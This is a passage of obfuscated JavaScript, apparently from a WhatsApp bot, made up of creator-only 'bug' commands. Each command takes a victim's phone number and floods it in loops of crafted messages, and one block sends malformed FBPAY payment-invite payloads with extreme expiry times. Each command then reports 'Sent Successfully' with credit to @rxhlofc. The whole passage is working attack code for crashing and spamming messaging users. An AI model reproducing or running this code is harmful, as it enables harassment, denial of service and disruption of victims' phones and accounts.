          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          await sleep(3000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          await sleep(3000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x35da8d);
          await sleep(8000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "gas-unex-a":
      case "gas-unex-b":
      case "gas-unex-c":
      case "gas-unex-d":
      case "gas-unex-e":
      case "gas-unex-f":
      case "gas-unex-g":
      case "gas-unex-h":
      case "gas-unex-i":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x5aed03 = 0; _0x5aed03 < 5; _0x5aed03++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x40fd73(Pe);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await sleep(3000);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await sleep(3000);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4375af(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await sleep(8000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "location-jids":
      case "location-memory":
      case "location-ganas":
      case "location-ui":
      case "location-system":
      case "location-vip":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x587aa6 = 0; _0x587aa6 < 5; _0x587aa6++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x528e4b(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x40fd73(Pe);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x7a2784(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x2bf3ee(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x6ce8c1(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await sleep(3000);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x528e4b(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x7a2784(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x2bf3ee(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x6ce8c1(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await sleep(3000);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x528e4b(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x7a2784(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x2bf3ee(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x6ce8c1(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x4c56ea(Pe);
          await sleep(8000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "gasin-ip":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x101fc4 = 0; _0x101fc4 < 4; _0x101fc4++) {
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(2000);
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(2000);
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 1814400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000
            }
          }, {});
          await _0x2f9d2e.relayMessage(Pe, {
            'paymentInviteMessage': {
              'serviceType': "FBPAY",
              'expiryTimestamp': Date.now() + 86400000000
            }
          }, {
            'participant': {
              'jid': Pe
            }
          });
          sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "gas-c1":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x4ae3a3 = 0; _0x4ae3a3 < 5; _0x4ae3a3++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await sleep(3000);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await sleep(3000);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x32754e(Pe, _0x35da8d);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await sleep(8000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "beta-bug":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x53c842 = 0; _0x53c842 < 8; _0x53c842++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x455c3d(Pe);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x455c3d(Pe);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "payment":
        if (!_0x4cefc4) {
          return;
        }
        const _0x3dcf42 = {
          image: _0x3ba96a
        };
        const _0x20cbba = {
          quoted: _0x18a4d7
        };
        _0x2f9d2e.sendMessage(_0x537416, _0x3dcf42, _0x20cbba);
        break;
      case "openvcs?":
      case "tutordek":
      case "nope-bg":
      case "hai-jebe":
      case "permisi":
      case "halo-bro":
        if (!_0x4cefc4) {
          return;
        }
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x4dd217 = 0; _0x4dd217 < 8; _0x4dd217++) {
          await _0x32754e(_0x537416, _0x2cdb40);
          await _0x4a505c(_0x537416);
          await _0x5a342a(_0x537416);
          await _0x455c3d(_0x537416);
          await _0x32754e(_0x537416, _0x2cdb40);
          await _0x4a505c(_0x537416);
          await _0x5a342a(_0x537416);
          await _0x455c3d(_0x537416);
          await _0x32754e(_0x537416, _0x2cdb40);
          await _0x4a505c(_0x537416);
          await _0x5a342a(_0x537416);
          await _0x455c3d(_0x537416);
          await _0x32754e(_0x537416, _0x2cdb40);
          await _0x4a505c(_0x537416);
          await _0x5a342a(_0x537416);
          await _0x455c3d(_0x537416);
          await sleep(2000);
          await _0x32754e(_0x537416, _0x2cdb40);
          await _0x4a505c(_0x537416);
          await _0x5a342a(_0x537416);
          await _0x455c3d(_0x537416);
          await _0x32754e(_0x537416, _0x2cdb40);
          await _0x4a505c(_0x537416);
          await _0x5a342a(_0x537416);
          await _0x455c3d(_0x537416);
          await _0x32754e(_0x537416, _0x2cdb40);
          await _0x4a505c(_0x537416);
          await _0x5a342a(_0x537416);
          await _0x455c3d(_0x537416);
          await _0x32754e(_0x537416, _0x2cdb40);
          await _0x4a505c(_0x537416);
          await _0x5a342a(_0x537416);
          await _0x455c3d(_0x537416);
          await sleep(7000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + _0x537416 + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "ui-beta":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x424fc6 = 0; _0x424fc6 < 8; _0x424fc6++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(6000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "spam-beta":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x6603e9 = 0; _0x6603e9 < 10; _0x6603e9++) {
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(2000);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x40fd73(Pe);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x4a505c(Pe);
          await _0x5a342a(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4a505c(Pe);
          await _0x48a831(Pe);
          await _0x455c3d(Pe);
          await _0x5d6a46(Pe);
          await _0x315e18(Pe);
          await _0x32754e(Pe, _0x2cdb40);
          await sleep(6000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "gasmek":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x324f8d = 0; _0x324f8d < 10; _0x324f8d++) {
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await sleep(3000);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await sleep(3000);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x4a505c(Pe);
          await _0x4a505c(Pe);
          await sleep(8000);
        }
        _0x2ea524(" ⌜ 𝗕𝘂𝗴 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻 ⌟\n ➵ 𝗦𝗲𝗻𝗱 𝘁𝗼: " + Pe + "\n ➵ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴: " + _0x63bd7f + "\n ➵ 𝗦𝘁𝗮𝘁𝘂𝘀: Sent Successfully\n ➵ 𝗦𝗰𝗿𝗶𝗽𝘁 𝗕𝘆: @rxhlofc");
        break;
      case "ori-bug":
      case "bisnis-bug":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!q) {
          return _0x41d276("Example:\n " + (_0x11f9b4 + _0x63bd7f) + " 62xxxx");
        }
        Pe = _0x18a4d7.mentionedJid[0] ? _0x18a4d7.mentionedJid[0] : _0x18a4d7.quoted ? _0x18a4d7.quoted.sender : q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        _0x2f9d2e.nampil("wait for the process to complete", _0x537416, _0x18a4d7);
        for (let _0x5d045b = 0; _0x5d045b < 10; _0x5d045b++) {
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x455c3d(Pe);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
          await _0x455c3d(Pe);
          await sleep(4000);
          await _0x32754e(Pe, _0x565e47);
          await _0x32754e(Pe, _0x2cdb40);
          await _0x4990de(Pe);
